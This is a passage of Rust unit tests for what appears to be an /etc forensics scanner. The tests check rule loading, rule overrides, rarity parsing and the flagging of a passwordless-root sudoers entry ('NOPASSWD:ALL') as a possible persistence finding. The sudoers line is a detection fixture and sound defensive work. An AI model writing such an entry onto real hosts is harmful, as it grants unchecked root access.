        set.reference.insert(("LNX-SUDO-NOPASSWD-ALL".into(), "sudo".into(), "etc/sudoers.d/90-cloud-init-users".into(), "ubuntu".into(), "ALL=(ALL) NOPASSWD:ALL".into()));
        let hits = set.hits("sudo", "etc/sudoers.d/90-cloud-init-users", &item("ubuntu", "ALL=(ALL) NOPASSWD:ALL"));
        assert!(hits[0].habitual);
        assert_eq!(judge(&hits).hunt, "habitual");
        let other = set.hits("sudo", "etc/sudoers.d/90-cloud-init-users", &item("eve", "ALL=(ALL) NOPASSWD:ALL"));
        assert!(!other[0].habitual);
        assert_eq!(judge(&other).hunt, "candidate");
        crate::diag::drain();
    }

    #[test]
    fn user_rules_files_override_and_errors() {
        crate::diag::set_quiet(true);
        let dir = std::env::temp_dir().join(format!("etcdump_rules_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("a.yaml"), "- name: MY-RULE\n  area: cron\n  data: [evil]\n  severity: high\n  why: mine\n- name: LNX-AT-JOB\n  area: at\n  severity: high\n  why: overridden at rule, now high\n- name: ''\n  area: x\n- name: EMPTY\n- name: BADSEV\n  area: x\n  severity: huge\n").unwrap();
        std::fs::write(dir.join("b.yml"), "not: [a list").unwrap();
        std::fs::write(dir.join("ignored.txt"), "x").unwrap();
        let set = RuleSet::load(true, &[dir.clone(), dir.join("missing")], &[dir.join("nope.tsv")]);
        assert!(set.rules.iter().any(|r| r.name == "MY-RULE"));
        assert_eq!(set.rules.iter().find(|r| r.name == "LNX-AT-JOB").unwrap().level(), "high");
        assert!(set.rules.iter().any(|r| r.name == "BADSEV" && r.level() == "medium"));
        for c in [code::RULES_RULE_DUPLICATE, code::RULES_RULE_NO_NAME, code::RULES_RULE_NO_CONDITION, code::RULES_BAD_SEVERITY, code::RULES_YAML_INVALID, code::RULES_FILE_UNREADABLE, code::RULES_REFERENCE_UNREADABLE, code::RULES_FILE_LOADED] {
            assert!(crate::diag::has(c), "{c}");
        }
        let hits = set.hits("cron", "etc/crontab", &item("x", "an evil thing"));
        assert_eq!(hits[0].rule, "MY-RULE");
        assert!(!hits[0].measured);
        let only = RuleSet::load(false, &[dir.join("a.yaml")], &[]);
        assert!(only.rules.iter().all(|r| !r.name.starts_with("LNX-") || r.name == "LNX-AT-JOB"));
        assert!(crate::diag::has(code::RULES_NO_BUILTIN));
        std::fs::write(dir.join("ref.tsv"), "R\tcron\tetc/crontab\tx\tv\nbad line\n").unwrap();
        let with_ref = RuleSet::load(true, &[], &[dir.join("ref.tsv")]);
        assert!(with_ref.reference.contains(&("R".into(), "cron".into(), "etc/crontab".into(), "x".into(), "v".into())));
        assert!(crate::diag::has(code::RULES_REFERENCE_LOADED));
        assert!(crate::diag::has(code::RULES_RARITY_BAD_LINE));
        let _ = std::fs::remove_dir_all(&dir);
        crate::diag::drain();
    }

    #[test]
    fn rarity_and_tsv_parsing() {
        crate::diag::set_quiet(true);
        let r = parse_rarity("# header\nA\t2\t100\t17\nbad\nB\tx\t1\t1\n");
        assert_eq!(r.get("A"), Some(&Rarity { hits: 2, rows: 100, points: 17 }));
        assert!(!r.contains_key("B"));
        assert_eq!(tsv("a\tb\nc"), "a b c");
        crate::diag::drain();
    }
}
